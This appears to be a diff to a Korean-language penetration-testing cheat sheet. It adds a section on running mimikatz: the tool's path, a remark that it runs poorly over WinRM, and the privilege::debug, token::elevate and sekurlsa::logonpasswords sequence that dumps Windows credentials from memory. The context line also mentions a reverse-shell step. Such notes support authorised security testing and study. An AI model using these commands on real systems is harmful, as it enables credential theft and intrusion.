@@ -927,3 +927,21 @@ cmdshell.run "<reverse shell>"
 ```
 	
 </details>
+
+---
+<details>
+	<summary><strong>mimikatz</strong></summary>
+
+- `WINRM` 상태에서는 실행이 제대로 안될 수 있으나, 다른 셸에서는 실행이 제대로 된다.
+- `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
+```powershell
+.\mimikatz.exe
+
+privilege::debug
+
+token::elevate
+
+sekurlsa::logonpasswords
+```
+	
+</details>
